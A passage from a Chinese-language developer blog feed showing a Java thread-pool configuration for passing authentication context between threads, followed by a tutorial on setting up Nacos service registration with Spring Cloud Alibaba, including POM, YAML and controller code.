class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ttl线程池配置</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;使用方式&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;<span class="doctag">@Resource</span>(name = "ttlExecutorService")&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;private ExecutorService ttlExecutorService;&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;或者&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在spring实例方法上使用：<span class="doctag">@Async</span>("ttlExecutorService")&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> guozhixian</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ttlThreadPoolConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicInteger ATOMIC_INTEGER = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CORE_POOL_SIZE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PLZDLX_CORE_POOL_SIZE = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXIMUM_POOL_SIZE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> KEEP_ALIVE_TIME = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CAPACITY = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建文书制作线程池：使用TtlExecutors可以使用AuthContextHolder信息</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;阿里开源的线程间上下文传递解决方案&lt;/p&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ExecutorService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(<span class="string">"ttlExecutorService"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ExecutorService <span class="title">executorService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TtlExecutors.getTtlExecutorService(<span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">                Runtime.getRuntime().availableProcessors() * CORE_POOL_SIZE,</span><br><span class="line">                Runtime.getRuntime().availableProcessors() * MAXIMUM_POOL_SIZE,</span><br><span class="line">                KEEP_ALIVE_TIME,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(CAPACITY),</span><br><span class="line">                r -&gt; <span class="keyword">new</span> Thread(r, <span class="string">"Thread-ttl"</span> + ATOMIC_INTEGER.getAndIncrement()),</span><br><span class="line">                <span class="keyword">new</span> MainRejectedExecutionHandler()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * AuthContextHolder</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 授权，用户信息ThreadLocal存储</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthContextHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;AuthInfo&gt; AUTHINFO_HOLDER = <span class="keyword">new</span> TransmittableThreadLocal&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">AuthContextHolder</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserContextHolder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@description</span> 清除上下文信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clearContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.debug(<span class="string">"从线程id:&#123;&#125;中清除信息"</span>, Thread.currentThread().getId());</span><br><span class="line">        AUTHINFO_HOLDER.remove();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * UserContextHolder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@description</span> 获取上下文信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> AuthInfo <span class="title">getContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.debug(<span class="string">"从线程id:&#123;&#125;中获取信息"</span>, Thread.currentThread().getId());</span><br><span class="line">        <span class="keyword">return</span> Optional.ofNullable(AUTHINFO_HOLDER.get()).orElse(<span class="keyword">new</span> AuthInfo());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * UserContextHolder</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@description</span> 设置上下文信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> user</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setContext</span><span class="params">(AuthInfo user)</span> </span>&#123;</span><br><span class="line">        log.debug(<span class="string">"从线程id:&#123;&#125;中获取信息"</span>, Thread.currentThread().getId());</span><br><span class="line">        AUTHINFO_HOLDER.set(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用：</p><p>方式一:Spring注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span>(name = <span class="string">"ttlExecutorService"</span>)</span><br><span class="line"><span class="keyword">private</span> ExecutorService ttlExecutorService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional</span>(rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">asyncDoThings</span>()</span>&#123;</span><br><span class="line">    ttlExecutorService.execute(() -&gt; &#123;</span><br><span class="line">    AuthInfo authInfo = AuthContextHolder.getContext();    </span><br><span class="line">doSomeThing();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方式二：@Async注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Async</span>(<span class="string">"ttlExecutorService"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">asyncDoThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       AuthInfo authInfo = AuthContextHolder.getContext();</span><br><span class="line">       doSomeThing();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> TtlExcutors </tag>
            
            <tag> Thread </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nacos服务注册发现与配置中心</title>
      <link href="/2021/10/05/Nacos%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/"/>
      <url>/2021/10/05/Nacos%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Nacos简介和下载"><a href="#Nacos简介和下载" class="headerlink" title="Nacos简介和下载"></a>Nacos简介和下载</h2><h3 id="为什么叫Nacos"><a href="#为什么叫Nacos" class="headerlink" title="为什么叫Nacos"></a><strong>为什么叫Nacos</strong></h3><ul><li>前四个字母分别为Naming和Configuration的前两个字母，最后的s为Service。</li></ul><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a><strong>是什么</strong></h3><ul><li>一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</li><li>Nacos: Dynamic Naming and Configuration Service</li><li>Nacos就是注册中心＋配置中心的组合 -&gt; Nacos = Eureka+Config+Bus</li></ul><h3 id="能干嘛"><a href="#能干嘛" class="headerlink" title="能干嘛"></a><strong>能干嘛</strong></h3><ul><li>替代Eureka做服务注册中心</li><li>替代Config做服务配置中心</li></ul><p><strong>去哪下</strong></p><ul><li><a href="https://github.com/alibaba/nacos/releases" target="_blank" rel="noopener">https://github.com/alibaba/nacos/releases</a></li><li><a href="https://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring%20cloud%20alibaba%20nacos_discovery" target="_blank" rel="noopener">官网文档</a></li></ul><p><strong>各中注册中心比较</strong></p><div class="table-container"><table><thead><tr><th>服务注册与发现框架</th><th>CAP模型</th><th>控制台管理</th><th>社区活跃度</th></tr></thead><tbody><tr><td>Eureka</td><td>AP</td><td>支持</td><td>低(2.x版本闭源)</td></tr><tr><td>Zookeeper</td><td>CP</td><td>不支持</td><td>中</td></tr><tr><td>consul</td><td>CP</td><td>支持</td><td>高</td></tr><tr><td>Nacos</td><td>AP\</td><td>\</td><td>CP可切换</td><td>支持</td><td>高</td></tr></tbody></table></div><p>据说Nacos在阿里巴巴内部有超过10万的实例运行，已经过了类似双十一等各种大型流量的考验。</p><h2 id="Nacos安装"><a href="#Nacos安装" class="headerlink" title="Nacos安装"></a>Nacos安装</h2><ul><li>本地Java8+Maven环境已经OK先</li><li>从<a href="https://github.com/alibaba/nacos/releases" target="_blank" rel="noopener">官网</a>下载Nacos</li><li>解压安装包，直接运行bin目录下的startup.cmd</li><li>命令运行成功后直接访问<a href="http://localhost:8848/nacos，默认账号密码都是nacos" target="_blank" rel="noopener">http://localhost:8848/nacos，默认账号密码都是nacos</a></li><li>结果页面</li></ul><p><img src="../img/Nacos/Nacos0.png" alt=""></p><h2 id="Nacos之服务提供者注册"><a href="#Nacos之服务提供者注册" class="headerlink" title="Nacos之服务提供者注册"></a>Nacos之服务提供者注册</h2><p><a href="https://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring_cloud_alibaba_nacos_discovery" target="_blank" rel="noopener">官方文档</a></p><p>新建Module - cloudalibaba-provider-payment9001</p><p>POM</p><p>父POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--spring cloud alibaba 2.1.0.RELEASE--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本模块POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud2020<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloudalibaba-provider-payment9001<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- SpringBoot整合Web组件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日常通用jar包配置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-payment-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#配置Nacos地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">'*'</span></span><br></pre></td></tr></table></figure><p>主启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentMain9001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            SpringApplication.run(PaymentMain9001<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>业务类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;server.port&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/payment/nacos/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPayment</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"nacos registry, serverPort: "</span>+ serverPort+<span class="string">"\t id"</span>+id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试</p><ul><li><a href="http://localhost:9001/payment/nacos/1" target="_blank" rel="noopener">http://localhost:9001/payment/nacos/1</a></li><li>nacos控制台</li><li>nacos服务注册中心+服务提供者9001都OK了</li></ul><h2 id="Nacos之服务消费者注册和负载"><a href="#Nacos之服务消费者注册和负载" class="headerlink" title="Nacos之服务消费者注册和负载"></a>Nacos之服务消费者注册和负载</h2><p>为什么nacos支持负载均衡？因为spring-cloud-starter-alibaba-nacos-discovery内含netflix-ribbon包。</p><p>新建Module - cloudalibaba-consumer-nacos-order83</p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>LearnCloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloudalibaba-consumer-nacos-order83<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span 